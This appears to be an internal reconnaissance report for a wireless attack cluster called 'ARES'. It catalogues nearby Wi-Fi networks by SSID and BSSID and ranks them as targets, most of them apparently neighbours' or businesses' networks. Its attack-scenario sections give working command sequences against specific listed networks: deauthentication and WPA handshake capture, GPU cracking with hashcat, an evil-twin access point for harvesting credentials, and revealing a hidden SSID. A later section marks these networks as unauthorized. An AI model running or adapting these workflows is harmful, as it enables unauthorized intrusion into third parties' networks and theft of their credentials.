# PROJECT ARES - Wireless Network Reconnaissance Report

**Operation**: Initial Network Survey
**Date**: January 15, 2026 17:32:31 IST
**Node**: Custom OpenWrt Router (ZeroTier IP: 10.73.168.3)
**Location**: Office Network (10.0.0.81)
**Operator**: ARES Cluster
**Authorization**: Own infrastructure reconnaissance only

---

## 📊 Executive Summary

**Networks Detected**: 10 total
- **2.4 GHz Band**: 7 networks
- **5 GHz Band**: 3 networks

**Security Posture**:
- WPA2 only: 6 networks (60%)
- Mixed WPA/WPA2: 4 networks (40%)
- Open/WEP: 0 networks (0%)

**Signal Quality**:
- Strong (-30 to -50 dBm): 0 networks
- Good (-51 to -60 dBm): 4 networks (40%)
- Fair (-61 to -80 dBm): 3 networks (30%)
- Weak (-81 to -90 dBm): 3 networks (30%)

**Risk Assessment**:
- ⚠️ Mixed WPA/WPA2 (vulnerable to downgrade): 4 networks
- ✅ WPA2 only (stronger): 6 networks
- ⚠️ TKIP encryption (deprecated): 4 networks

---

## 🔍 Detailed Scan Results

### 2.4 GHz Band Analysis

| # | ESSID | BSSID | Channel | Signal | Quality | Encryption | HT Width |
|---|-------|-------|---------|--------|---------|------------|----------|
| 1 | Airtel showroom | B4:A7:C6:13:4E:09 | 1 | -84 dBm | 26/70 | Mixed WPA/WPA2 (TKIP+CCMP) | 20 MHz |
| 2 | **Airtel_vish_0615** | FC:9F:2A:27:66:1F | 11 | **-51 dBm** | **59/70** | Mixed WPA/WPA2 (TKIP+CCMP) | 40 MHz+ |
| 3 | Dharmani Guest | 9E:C2:F4:0D:77:FE | 3 | -87 dBm | 23/70 | WPA2 (CCMP) | 20 MHz |
| 4 | Airtel_neer_3257 | F8:0D:A9:B5:D2:AA | 1* | -78 dBm | 32/70 | Mixed WPA/WPA2 (TKIP+CCMP) | 20 MHz |
| 5 | Airtel_PAISLEY | 24:43:E2:BB:56:E0 | 6 | -87 dBm | 23/70 | Mixed WPA/WPA2 (TKIP+CCMP) | 40 MHz+ |
| 6 | **Dharmani Office** | 10:27:F5:CD:07:73 | 10 | **-61 dBm** | **49/70** | WPA2 (CCMP) | 40 MHz+ |
| 7 | **Dharmani Guest** | 12:27:F5:DD:07:73 | 10 | **-61 dBm** | **49/70** | WPA2 (CCMP) | 40 MHz+ |

*Note: Cell 04 shows frequency 2.412 GHz (Channel 1) but HT Primary Channel 7 - possible configuration anomaly

**Channel Distribution (2.4 GHz)**:
```
Channel 1:  ▓▓ (2 APs - moderate congestion)
Channel 3:  ▓  (1 AP)
Channel 6:  ▓  (1 AP)
Channel 10: ▓▓ (2 APs - Dharmani Office + Guest)
Channel 11: ▓  (1 AP - Airtel_vish_0615)
```

**Observations**:
- Channel 10 has multiple BSSIDs (likely same router with guest network)
- Channel 1 and 10 are most congested
- Best signal: **Airtel_vish_0615** (-51 dBm) and **Dharmani Office/Guest** (-61 dBm)

---

### 5 GHz Band Analysis

| # | ESSID | BSSID | Channel | Signal | Quality | Encryption | VHT Width |
|---|-------|-------|---------|--------|---------|------------|-----------|
| 1 | **Airtel_vish_0615** | FC:9F:2A:27:66:20 | 36 | **-51 dBm** | **59/70** | Mixed WPA/WPA2 (TKIP+CCMP) | 80 MHz |
| 2 | (Hidden SSID) | EE:9F:2A:27:66:20 | 36 | -51 dBm | 59/70 | WPA2 (CCMP) | 80 MHz |
| 3 | Dharmani Office+ | 10:27:F5:CD:07:72 | 161 | -73 dBm | 37/70 | WPA2 (CCMP) | 80 MHz |

**Channel Distribution (5 GHz)**:
```
Channel 36:  ▓▓ (2 APs - same location, different SSIDs)
Channel 161: ▓  (1 AP - Dharmani Office+)
```

**Observations**:
- Excellent spacing (36 and 161 - no interference)
- Cell 02 has hidden SSID but visible BSSID (EE:9F:2A:27:66:20)
- Best signal: **Airtel_vish_0615** (-51 dBm, dual-band)
- All using VHT80 (802.11ac, 80 MHz wide channels)

---

## 🔐 Security Analysis

### Vulnerability Assessment

#### High Priority Targets (Mixed WPA/WPA2)
These networks support both WPA and WPA2, vulnerable to downgrade attacks:

1. **Airtel_vish_0615** (Dual-band)
   - 2.4 GHz: FC:9F:2A:27:66:1F, Channel 11, -51 dBm
   - 5 GHz: FC:9F:2A:27:66:20, Channel 36, -51 dBm
   - Encryption: Mixed WPA/WPA2 (TKIP + CCMP)
   - ⚠️ TKIP is deprecated and vulnerable
   - Signal: Excellent (likely nearby)
   - Attack vectors: WPA downgrade, TKIP replay, handshake capture

2. **Airtel showroom**
   - BSSID: B4:A7:C6:13:4E:09
   - Channel: 1 (2.4 GHz)
   - Signal: -84 dBm (weak, likely distant)
   - Encryption: Mixed WPA/WPA2 (TKIP + CCMP)

3. **Airtel_neer_3257**
   - BSSID: F8:0D:A9:B5:D2:AA
   - Channel: 1 (2.4 GHz)
   - Signal: -78 dBm (fair)
   - Encryption: Mixed WPA/WPA2 (TKIP + CCMP)

4. **Airtel_PAISLEY**
   - BSSID: 24:43:E2:BB:56:E0
   - Channel: 6 (2.4 GHz)
   - Signal: -87 dBm (weak)
   - Encryption: Mixed WPA/WPA2 (TKIP + CCMP)

#### Medium Priority (WPA2 Only)
These networks use WPA2 only (stronger, but still capturable):

5. **Dharmani Office** + **Dharmani Guest**
   - Office BSSID: 10:27:F5:CD:07:73
   - Guest BSSID: 12:27:F5:DD:07:73, 9E:C2:F4:0D:77:FE
   - Channel: 10 (2.4 GHz), 161 (5 GHz)
   - Signal: -61 dBm (good, nearby)
   - Encryption: WPA2 (CCMP) ✅
   - Note: Multiple BSSIDs suggest same router with guest network

6. **Hidden SSID Network**
   - BSSID: EE:9F:2A:27:66:20
   - Channel: 36 (5 GHz)
   - Signal: -51 dBm (excellent)
   - Encryption: WPA2 (CCMP)
   - Note: Hidden SSID provides no real security (BSSID still visible)

---

## 🎯 ARES Attack Scenarios (Authorization Required)

### Scenario 1: WPA2 Handshake Capture → GPU Cracking

**Target**: Airtel_vish_0615 (Mixed WPA/WPA2, excellent signal)

**Workflow**:
```bash
# 1. Router: Set to monitor mode on channel 11 (2.4 GHz)
ssh root@10.73.168.3 "/root/ares_control.sh monitor 11"

# 2. Router: Start handshake capture
ssh root@10.73.168.3 "airodump-ng --bssid FC:9F:2A:27:66:1F -c 11 -w /tmp/airtel_vish phy0-ap0"

# 3. Router: Trigger deauth to capture handshake
ssh root@10.73.168.3 "aireplay-ng --deauth 10 -a FC:9F:2A:27:66:1F phy0-ap0"

# 4. Office Server: Download capture
scp root@10.73.168.3:/tmp/airtel_vish-01.cap /opt/ares/captures/

# 5. Office Server: Convert to hashcat format
hcxpcapngtool -o /opt/ares/handshakes/airtel_vish.hc22000 /opt/ares/captures/airtel_vish-01.cap

# 6. GPU Server: Crack with 4x RX570 (50+ GH/s)
ssh root@gpu-server "hashcat -m 22000 /opt/ares/handshakes/airtel_vish.hc22000 /opt/wordlists/rockyou.txt --opencl-device-types=1,2"

# Estimated crack time:
# - 8-char lowercase: ~2 minutes
# - 8-char mixed case: ~2 hours
# - 10-char complex: Several days
```

**Success Rate**: High (mixed WPA/WPA2 with TKIP is weak)

---

### Scenario 2: Evil Twin / Rogue AP

**Target**: Dharmani Guest (public guest network)

**Workflow**:
```bash
# 1. Router: Create identical fake AP on 5 GHz
ssh root@10.73.168.3 "/root/ares_control.sh rogue_ap 'Dharmani Guest'"

# 2. Router: Configure DHCP for clients
# (Already in ares_control.sh script)

# 3. Router: Start packet capture
ssh root@10.73.168.3 "tcpdump -i phy1-ap0 -w /tmp/evil_twin.pcap"

# 4. Wait for clients to connect (credential harvesting)
# 5. Analyze captured credentials on Office Server
```

**Success Rate**: Medium (depends on client proximity and signal strength)

---

### Scenario 3: Hidden SSID Revelation

**Target**: EE:9F:2A:27:66:20 (Hidden SSID on 5 GHz)

**Method**:
```bash
# Hidden SSIDs are revealed during probe requests or association
# 1. Monitor mode on channel 36
ssh root@10.73.168.3 "/root/ares_control.sh monitor 36"

# 2. Capture probe requests
ssh root@10.73.168.3 "tcpdump -i phy0-ap0 'type mgt subtype probe-req' -w /tmp/hidden_ssid.pcap"

# 3. Or trigger deauth to capture association (reveals SSID)
ssh root@10.73.168.3 "aireplay-ng --deauth 5 -a EE:9F:2A:27:66:20 phy0-ap0"

# 4. Analyze capture to extract SSID
tcpdump -r /tmp/hidden_ssid.pcap -vv | grep SSID
```

---

## 📈 Channel Congestion Analysis

### 2.4 GHz Band (Crowded)
```
  Channel 1  [▓▓░░░░░░░░] 20% (2 APs)
  Channel 3  [▓░░░░░░░░░] 10% (1 AP)
  Channel 6  [▓░░░░░░░░░] 10% (1 AP)
  Channel 10 [▓▓░░░░░░░░] 20% (2 APs)
  Channel 11 [▓░░░░░░░░░] 10% (1 AP)
```

**Recommendation**: Use Channel 3, 6, or 11 for ARES operations (least congested)

### 5 GHz Band (Clear)
```
  Channel 36  [▓▓░░░░░░░░] 20% (2 APs)
  Channel 161 [▓░░░░░░░░░] 10% (1 AP)
```

**Recommendation**: 5 GHz band is ideal for ARES rogue AP operations (low congestion, high bandwidth)

---

## 🚨 Operational Security Notes

### Legal & Ethical Considerations

⚠️ **CRITICAL**: All networks detected are **UNAUTHORIZED** for testing without explicit written permission.

**Authorized Actions**:
- ✅ Passive monitoring (no transmission)
- ✅ Signal strength measurement
- ✅ Channel analysis
- ✅ Security posture assessment

**UNAUTHORIZED Actions** (require written authorization):
- ❌ Deauthentication attacks
- ❌ Handshake capture
- ❌ Rogue AP creation
- ❌ Credential harvesting
- ❌ Traffic interception

### Authorization Checklist for ARES Operations

```
Before ANY active testing:

[ ] Written authorization from network owner
[ ] Scope document (SSIDs, BSSIDs, time window)
[ ] Incident response contact (emergency stop)
[ ] Data handling agreement (destroy captures after)
[ ] Legal review (if commercial client)
[ ] Insurance coverage (if professional pentest)

Acceptable Use Cases:
✓ Own infrastructure ("Dharmani Office" if you own it)
✓ CTF competition networks
✓ Isolated lab environment
✓ Bug bounty programs (with authorization)

NEVER test on:
✗ Neighbor networks (Airtel_vish_0615, etc.)
✗ Public WiFi (Airtel showroom)
✗ Corporate networks without permission
```

---

## 📊 ARES Cluster Status

### Current Resources

| Server | Role | Status | Capabilities |
|--------|------|--------|--------------|
| **Office Server** | C2 Controller | ✅ Online | Kali Linux, Metasploit, Empire C2 |
| **Lab Server** | Reconnaissance | ✅ Online | Nmap, Masscan, SQLMap, Burp Suite |
| **GPU Server** | Hash Cracking | ✅ Online | 4x RX570, Hashcat, 50+ GH/s MD5 |
| **Router** | Wireless Node | ✅ Online | Dual-band WiFi, ZeroTier C2, Monitor mode |

**Cluster Connectivity**:
- Office Server ↔ Router: ZeroTier (10.73.168.3)
- Office Server ↔ Lab/GPU: K3s cluster (10.0.0.x)
- Router ↔ Office Network: Direct (10.0.0.81)

**Status**: ✅ **ARES Cluster Fully Operational**

---

## 🎯 Prioritized Target List (Authorization Required)

### Tier 1: High-Value Targets (if authorized)
1. **Airtel_vish_0615** (Dual-band, mixed WPA/WPA2, excellent signal)
2. **Dharmani Office** (WPA2, good signal, enterprise network)

### Tier 2: Research Targets (if authorized)
3. **Hidden SSID** (EE:9F:2A:27:66:20) - SSID revelation exercise
4. **Dharmani Guest** - Rogue AP testing (guest network simulation)

### Tier 3: Low Priority (weak signal or low value)
5. **Airtel showroom** - Weak signal, likely distant
6. **Airtel_neer_3257** - Fair signal
7. **Airtel_PAISLEY** - Weak signal

---

## 📝 Recommendations

### For Router Configuration
1. ✅ Install aircrack-ng suite (next step)
2. ✅ Deploy ARES control scripts
3. ✅ Configure automated capture rotation
4. ⚠️ Consider removing remote.it (free 8 MB RAM for operations)

### For ARES Operations
1. 🎯 Focus on **own infrastructure testing** first
2. 📋 Document authorization process
3. 🔐 Implement secure capture storage (encrypt at rest)
4. 📊 Create automated reporting pipeline
5. 🔄 Schedule regular reconnaissance (weekly scans)

---

## 🔬 Next Actions

### Phase 1: Tool Installation (Today)
- [ ] Install aircrack-ng suite on router
- [ ] Test monitor mode functionality
- [ ] Verify packet injection capability
- [ ] Test handshake capture workflow

### Phase 2: Script Deployment (Today)
- [ ] Deploy `/root/ares_control.sh` on router
- [ ] Deploy `/opt/ares/scripts/router_control.sh` on Office Server
- [ ] Test remote control via ZeroTier
- [ ] Verify capture transfer to Office Server

### Phase 3: Integration Testing (This Week)
- [ ] Capture handshake from **authorized network** (own network)
- [ ] Transfer to GPU Server
- [ ] Crack with 4x RX570 GPUs
- [ ] Measure end-to-end workflow time

---

**Report Generated**: January 15, 2026 17:32:31 IST
**Classification**: INTERNAL - ARES Project Use Only
**Authorization**: Reconnaissance only, no active testing without written authorization

**Networks Discovered**: 10 total (7x 2.4GHz, 3x 5GHz)
**Security Posture**: 60% WPA2 only, 40% mixed (vulnerable)
**ARES Status**: ✅ Router operational, ready for tool installation
**Next Step**: Install aircrack-ng and deploy control scripts

**C2 Access**: `ssh root@10.73.168.3` (via ZeroTier from anywhere)
